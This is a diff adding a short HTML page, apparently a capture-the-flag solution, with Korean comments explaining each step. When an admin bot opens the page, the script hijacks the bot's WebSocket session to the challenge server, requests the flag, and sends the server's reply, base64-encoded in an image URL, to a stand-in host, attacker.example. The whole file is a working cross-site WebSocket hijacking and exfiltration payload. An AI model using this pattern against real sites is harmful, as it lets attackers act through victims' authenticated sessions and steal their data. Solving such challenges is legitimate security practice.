@@ -1,0 +1,13 @@
+<!doctype html>
+<meta charset="utf-8">
+<script>
+/* 1) adminBot이 이 페이지를 열면, 아래 코드가 실행됨            */
+const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
+ws.onopen = () => ws.send(JSON.stringify({message:'/getFlag'}));
+
+/* 2) 서버가 보내주는 플래그를 우리 서버로 exfiltrate              */
+ws.onmessage = ev => {
+  /* ev.data === '{"message":"Flag: CTF{...}","sender":"URL Bot"}' */
+  new Image().src = 'https://attacker.example/steal?d=' + encodeURIComponent(btoa(ev.data));
+};
+</script>
